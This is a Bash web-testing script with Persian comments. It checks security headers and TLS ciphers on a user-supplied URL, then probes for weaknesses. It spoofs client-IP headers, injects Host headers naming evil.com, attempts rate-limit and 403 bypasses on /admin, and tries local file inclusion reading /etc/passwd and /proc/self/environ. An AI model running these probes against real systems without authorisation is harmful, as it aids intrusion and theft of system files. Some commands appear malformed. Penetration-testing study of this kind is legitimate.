#!/bin/bash

# تابعی برای دریافت URL هدف از کاربر
get_target_url() {
    read -p "Enter the target URL (e.g., http://example.com): " target_url
    echo "Target URL is set to: $target_url"
}

# فراخوانی تابع برای دریافت URL هدف
get_target_url

echo -e "\n[+] Starting security checks on: $target_url"

# بررسی robots.txt
echo -e "\n[+] Checking robots.txt..."
curl -s "$target_url/robots.txt" || echo "robots.txt not found"

# بررسی هدرها
echo -e "\n[+] Checking headers..."
wget --save-headers -q -O- "$target_url" | head -n 20  # هدرها را نشان می‌دهد

# بررسی هدرهای امنیتی
echo -e "\n[+] Checking security headers..."
headers=$(wget --save-headers -q -O- "$target_url")

# تعریف و بررسی هدرهای امنیتی همراه با توضیحات
echo -e "\n[+] Security Headers Explanation:"

# Strict-Transport-Security (HSTS)
echo -e "\nStrict-Transport-Security (HSTS):"
echo "Enforces secure (HTTP over SSL/TLS) connections to the server."
echo "$headers" | grep -i "Strict-Transport-Security" || echo "Not set"

# X-Frame-Options
echo -e "\nX-Frame-Options:"
echo "Protects against clickjacking by controlling if a site can be framed by other sites."
echo "$headers" | grep -i "X-Frame-Options" || echo "Not set"

# X-XSS-Protection
echo -e "\nX-XSS-Protection:"
echo "Enables cross-site scripting (XSS) protection in the browser."
echo "$headers" | grep -i "X-XSS-Protection" || echo "Not set"

# X-Content-Type-Options
echo -e "\nX-Content-Type-Options:"
echo "Prevents MIME-sniffing and forces browser to follow declared content type."
echo "$headers" | grep -i "X-Content-Type-Options" || echo "Not set"

# بررسی کوکی‌ها
echo -e "\n[+] Checking cookies..."
curl -s -I "$target_url" | grep "Set-Cookie"

# بررسی SSL Ciphers
echo -e "\n[+] Checking SSL Ciphers..."
nmap --script ssl-enum-ciphers -p 443 "$target_url"

# بررسی HTTP Methods
echo -e "\n[+] Checking HTTP Methods..."
nmap -p 443 --script http-methods "$target_url"

# بررسی Cross Domain Policy
echo -e "\n[+] Checking Cross Domain Policy..."
curl -s "$target_url/crossdomain.xml" || echo "crossdomain.xml not found"

# Quick Tricks
echo -e "\n[+] Running Quick Tricks..."

# بررسی دسترسی به /favicon.ico
echo -e "\nChecking for /favicon.ico"
curl -s "$target_url/favicon.ico" -o /dev/null -w "%{http_code}\n"

# تغییر هدر 'Accept' برای بررسی پاسخ
echo -e "\nSending modified 'Accept' header"
curl -s -I -H "Accept: application/json, text/javascript, */*; q=0.01" "$target_url"

# درخواست 'debug' برای اطلاعات اضافی
echo -e "\nRequesting 'debug' mode"
curl -s "$target_url?debug=1"

# بررسی گزینه های HTTP (OPTIONS) برای بررسی متدهای مجاز
echo -e "\nChecking HTTP OPTIONS method"
curl -v -k -X OPTIONS "$target_url" 2>&1 | grep "Allow"

# تلاش برای دور زدن محدودیت‌های نرخ (Rate Limit)
echo -e "\nBypassing rate limits with alternative parameters"
curl -s -o /dev/null -w "%{http_code}\n" "$target_url/signup"
curl -s -o /dev/null -w "%{http_code}\n" "$target_url/Sign-up"
curl -s -o /dev/null -w "%{http_code}\n" "$target_url/SignUp"

# Header Injections
echo -e "\n[+] Testing Header Injections..."

# تعریف مجموعه‌ای از هدرهای جعلی
declare -A fake_headers=(
    ["Client-IP"]="127.0.0.1"
    ["X-Client-IP"]="127.0.0.1"
    ["X-Forwarded-For"]="127.0.0.1"
    ["X-Forwarded-Host"]="localhost"
    ["X-Forwarded-Server"]="localhost"
    ["X-Real-IP"]="127.0.0.1"
    ["X-Originating-IP"]="127.0.0.1"
    ["X-Remote-Addr"]="127.0.0.1"
)

# ارسال درخواست با هر هدر تزریقی
for header in "${!fake_headers[@]}"; do
    echo -e "\nTesting header: $header: ${fake_headers[$header]}"
    curl -s -o /dev/null -w "%{http_code}\n" -H "$header: ${fake_headers[$header]}" "$target_url"
done

# Add Line Wrapping
echo -e "\n[+] Testing Add Line Wrapping..."

# درخواست با ساختار خطی تغییر یافته
curl -s -o /dev/null -w "%{http_code}\n" -H "Host: $target_url" -H "Host: evil.com" "$target_url"
curl -s -o /dev/null -w "%{http_code}\n" -H "Host: $target_url" -H "Stuff: stuff" -H "Host: evil.com" "$target_url"
curl -s -o /dev/null -w "%{http_code}\n" -H "GET /index.php HTTP/1.1" -H " Host: $target_url" "$target_url"
curl -s -o /dev/null -w "%{http_code}\n" -H "GET / HTTP/1.1" -H "Host: $target_url" -H "Host: evil.com" "$target_url"

# Basic LFI Tests
echo -e "\n[+] Testing for Basic Local File Inclusion (LFI)..."

# درخواست برای فایل‌های حساس
sensitive_paths=(
    "/etc/passwd"
    "/etc/hosts"
    "/var/www/html/config.php"
    "/proc/self/environ"
    "/var/log/apache2/access.log"
)

# تست مسیرهای حساس با پارامتر page
for path in "${sensitive_paths[@]}"; do
    echo -e "\nTesting LFI with path: $path"
    curl -s "$target_url/gallery.php?page=$path" | head -n 10  # خروجی را محدود می‌کند
done

# 403 Bypasses
echo -e "\n[+] Testing 403 Bypasses..."

# تعریف مسیرهای تست برای دور زدن 403
paths=(
    "/admin"
    "/accessible/..;/admin"
    "/.;/admin"
    "/admin;/"
    "/admin/~"
    "/./admin/./"
    "/admin?param"
    "/%2e/admin"
    "/admin#"
    "/secret/"
    "//secret//"
    "/./secret/.."
    "/admin..;/"
    "/admin%20/"
    "/%20admin%20/"
    "/admin%20/page"
    "/%61dmin"
)

# تست هر مسیر با تکنیک‌های دور زدن 403
for path in "${paths[@]}"; do
    echo -e "\nTesting 403 bypass techniques for path: $path"
    curl -s -o /dev/null -w "Normal request: %{http_code}\n" "$target_url$path"
done
